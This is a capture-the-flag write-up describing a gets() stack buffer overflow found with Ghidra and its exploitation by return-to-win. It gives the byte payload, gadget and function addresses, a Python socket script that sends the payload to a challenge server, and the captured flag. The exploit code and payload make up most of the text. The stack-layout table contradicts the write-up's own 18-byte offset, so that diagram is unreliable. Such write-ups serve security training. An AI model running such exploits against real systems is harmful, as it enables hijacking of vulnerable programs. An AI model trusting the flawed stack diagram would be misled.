I opened the file with Ghidra and find out this :

The hello() function uses gets(local_12), which is dangerously unsafe:

- local_12 is a 10-byte buffer (char[10]).
- gets() does not check input size → if you send >10 bytes, it overwrites adjacent memory on the stack.
- This is a classic stack-based buffer overflow.

When hello() is called, the stack looks like this (growing downward):
| Address (High → Low) | Content               | Size   |
|----------------------|-----------------------|--------|
| ...                  | Previous stack frames | ...    |
| `RBP + 0x00`         | `local_12` (buffer)   | 10 B   |
| `RBP + 0x0A`         | **Padding** (unused)  | 6 B    |
| `RBP + 0x10`         | **Saved RBP**         | 8 B    |
| `RBP + 0x18`         | **Return Address**    | 8 B ← **TARGET** |
| ...                  | ...                   | ...    |

To overwrite the return address, we need: 10 (buffer) + 8 (RBP) = 18 bytes of padding.


Our payload must:
- Fill the buffer + RBP: 18 bytes of junk (e.g., 'A').
- Overwrite return address: ret gadget (0x40125d) in little-endian.
- Next address: win() (0x401262) in little-endian.

| Part               | Value (Hex)       | Little-Endian Bytes          | Size  |
|--------------------|-------------------|------------------------------|-------|
| Padding            | -                 | `AAAAAAAAAAAAAAAAAA`        | 18 B  |
| `ret` gadget       | 0x40125d          | `\x5d\x12\x40\x00\x00\x00\x00\x00` | 8 B   |
| `win()` address    | 0x401262          | `\x62\x12\x40\x00\x00\x00\x00\x00` | 8 B   |
| **Total**          | -                 | -                            | **34 B** |



Final Payload (Hex):
```hex
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
5d 12 40 00 00 00 00 00
62 12 40 00 00 00 00 00
```

Now we just have to send it to the server using python because copy paste will not work here :
```py
import socket

HOST, PORT = "145.239.142.129", 1340

payload = (
    b"A" * 18 +
    bytes.fromhex("5d12400000000000") +
    bytes.fromhex("6212400000000000")
)

with socket.socket() as s:
    s.connect((HOST, PORT))
    s.sendall(payload + b"\n")

    response = b""
    while True:
        data = s.recv(4096)
        if not data:
            break
        response += data

    print(response.decode(errors="ignore"))
```

And the return is : OWASP{g3ts_1s_4_s3cur1ty_n1ghtm4r3}
